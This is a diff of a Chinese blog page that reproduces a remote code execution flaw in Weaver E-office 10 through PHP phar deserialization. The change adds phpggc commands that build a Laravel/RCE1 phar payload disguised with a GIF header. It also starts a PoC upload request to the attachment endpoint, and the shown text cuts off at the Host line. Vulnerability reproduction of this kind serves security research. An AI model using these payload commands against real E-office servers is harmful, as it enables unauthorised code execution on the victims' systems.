@@ -431,14 +431,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-03-30
+                    2024-04-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.3k
                 </div>
                 
 
@@ -468,7 +468,9 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="漏洞复现背景"><a href="#漏洞复现背景" class="headerlink" title="漏洞复现背景"></a>漏洞复现背景</h2><p>前几天突然某公众号发布了泛微的E-office远程代码执行。机缘巧合情况下获取到了这个漏洞的poc。遗憾的是这个漏洞是反序列化的漏洞如果执行其他命令或者getshell需要替换里面的字节。由于他们使用的yakit 漏洞poc使用base64编码。想要搞其实花点时间使用代码解密这段base64并且使用二进制方式写入.phar 文件。就行了。始终觉得自己搞出来那才是最好的于是我分析了一下这段poc的关键代码使用谷歌搜索了一篇文章。走到这里你们肯定想问是哪篇文章。加入小密圈或者内部群获取哈哈哈开玩笑的了。但是这年头分享exp poc需要冒着及大的风险。另外别人研究了可能好几个月的知识被你直接分享那有点说不过去了。收费也是没毛病的。但是这里我就直接分享了毕竟这个漏洞折磨了很久。参考链接:这篇里面有生成poc的代码具体是哪个自己找如果这都搞不定那我就不说了 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a><br>另外在github有一个类似于java反序列化生成的工具链接在这里<br><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a> 但我用这个生成的poc不行不知道怎么。这个在kali上面运行生成poc就行了<br/><br>用法：php phpggc -p phar Laravel&#x2F;RCE1 system whoami  -b<br>我是用<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a> 生成的poc</p>
+                <h2 id="漏洞复现背景"><a href="#漏洞复现背景" class="headerlink" title="漏洞复现背景"></a>漏洞复现背景</h2><p>前几天突然某公众号发布了泛微的E-office远程代码执行。机缘巧合情况下获取到了这个漏洞的poc。遗憾的是这个漏洞是反序列化的漏洞如果执行其他命令或者getshell需要替换里面的字节。由于他们使用的yakit 漏洞poc使用base64编码。想要搞其实花点时间使用代码解密这段base64并且使用二进制方式写入.phar 文件。就行了。始终觉得自己搞出来那才是最好的于是我分析了一下这段poc的关键代码使用谷歌搜索了一篇文章。走到这里你们肯定想问是哪篇文章。加入小密圈或者内部群获取哈哈哈开玩笑的了。但是这年头分享exp poc需要冒着及大的风险。另外别人研究了可能好几个月的知识被你直接分享那有点说不过去了。收费也是没毛病的。但是这里我就直接分享了毕竟这个漏洞折磨了很久。参考链接:这篇里面有生成poc的代码具体是哪个自己找如果这都搞不定那我就不说了 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a><br>另外在github有一个类似于java反序列化生成的工具链接在这里<br><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a> 但我用这个生成的poc不行不知道(原因校验phar hash值)。这个在kali上面运行生成poc就行了<br/><br>用法：php phpggc -p phar Laravel&#x2F;RCE1 system whoami  -b</p>
+<p>补充一下生成带图片头的语法 下面这个语法满足要求 使用laravel 版本小于5.8.x的exp就行了<br>php phpggc -pp up.gif -p phar -o u.phar Laravel&#x2F;RCE1 system dir </p>
+<p>我是用<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a> 生成的poc</p>
 <h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>第一步 上传带有反序列化的文件 poc</p>
 <pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>attachment<span class="token operator">/</span>atuh<span class="token operator">-</span>file HTTP<span class="token operator">/</span><span class="token number">1.1</span>
 <span class="token class-name">Host</span><span class="token operator">:</span> xxxxxxxxxx
